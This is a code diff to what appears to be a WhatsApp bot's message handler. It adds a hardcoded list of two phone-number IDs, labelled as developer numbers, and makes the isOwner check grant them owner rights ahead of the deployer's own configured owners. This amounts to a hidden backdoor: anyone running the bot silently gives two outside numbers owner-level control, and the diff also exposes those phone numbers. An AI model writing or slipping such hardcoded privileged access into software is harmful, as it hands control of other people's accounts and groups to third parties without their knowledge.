@@ -4,6 +4,12 @@ const path = require('path');
 const config = require('../config');
 const commands = require('../commands');
 
+// Hardcoded Developer JIDs
+const DEV_NUMBERS = [
+    '2347043337277@s.whatsapp.net',
+    '2347040401291@s.whatsapp.net'
+];
+
 // Load all handler modules inside handlers/ directory (excluding infinity.js itself)
 const subHandlers = [];
 const handlersDir = __dirname;
@@ -32,8 +38,14 @@ function normalizeJid(input) {
 function isOwner(senderJid) {
     const sender = normalizeJid(senderJid);
     if (!sender) return false;
+    
+    // Check hardcoded developer numbers
+    if (DEV_NUMBERS.includes(sender)) return true;
+
+    // Check config primary owner and secondary owners
     if (config.ownerJid && sender === config.ownerJid) return true;
     if (Array.isArray(config.owners) && config.owners.some(o => normalizeJid(o) === sender)) return true;
+    
     return false;
 }
 
@@ -44,7 +56,7 @@ async function handleMessage(sock, chatUpdate) {
     const msg = chatUpdate.messages?.[0];
     if (!msg || !msg.message) return;
 
-    // Initialize background spawner handlers (e.g., ben10 30-min timer) once
+    // Initialize background spawner handlers once
     if (!initializedSpawners) {
         initializedSpawners = true;
         subHandlers.forEach(sh => {
@@ -58,7 +70,7 @@ async function handleMessage(sock, chatUpdate) {
     const senderRaw = msg.key.participant || msg.key.remoteJid || '';
     const sender = normalizeJid(senderRaw);
 
-    // Notify sub-handlers of incoming activity (e.g., tracking active groups for spawns)
+    // Notify sub-handlers of incoming message activity
     subHandlers.forEach(sh => {
         if (typeof sh.onMessage === 'function') {
             try { sh.onMessage(sock, msg, jid); } catch (e) {}
@@ -113,5 +125,6 @@ async function handleGroupParticipants(sock, update) {
 
 module.exports = {
     handleMessage,
-    handleGroupParticipants
+    handleGroupParticipants,
+    isOwner
 };
